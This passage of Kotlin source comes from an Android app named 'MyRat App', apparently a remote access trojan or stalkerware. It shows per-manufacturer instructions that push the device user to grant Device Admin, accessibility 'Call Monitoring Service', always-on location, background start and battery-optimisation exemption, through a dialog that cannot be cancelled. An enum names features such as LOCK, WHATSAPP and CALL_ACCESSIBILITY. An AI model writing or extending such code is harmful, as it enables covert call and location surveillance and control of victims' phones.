            "vivo" -> "1. Settings > Battery > High Background Power > MyRat App > Enable\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Allow background pop-ups, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings"
            "huawei" -> "1. Settings > Apps > MyRat App > Startup Management > Allow autostart\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Pop-up windows, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings\n6. Disable battery optimization in Settings > Battery"
            "samsung" -> "1. Settings > Device Care > Battery > MyRat App > No Restrictions\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Pop-up windows, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings"
            else -> "1. Settings > Apps > MyRat App > Permissions > Enable all permissions\n2. Enable 'Display over other apps' in App Settings\n3. Enable Device Admin in Settings > Security\n4. Enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings\n6. Disable battery optimization in Settings > Battery > Battery Optimization > MyRat App > Don't Optimize"
        }
        try {
            AlertDialog.Builder(activity)
                .setTitle("Manual Instructions")
                .setMessage(instructions)
                .setPositiveButton("OK") { _, _ ->
                    if (fromBatteryOptimizationSettings) {
                        checkBatteryOptimization()
                    } else if (fromOverlaySettings) {
                        checkOverlayPermission()
                    } else if (fromDeviceAdminSettings) {
                        checkDeviceAdminPermission()
                    } else if (fromAccessibilitySettings) {
                        checkAccessibilityPermission()
                    } else {
                        requestPermissions()
                    }
                }
                .setCancelable(false)
                .show()
        } catch (e: Exception) {
            Logger.error("Failed to show manual instructions dialog", e)
        }
    }

    enum class Feature {
        RESTRICTED, LOCATION, PHONE, STORAGE, INTERNET, LOCK, WHATSAPP, CALL_ACCESSIBILITY, GENERAL
    }
}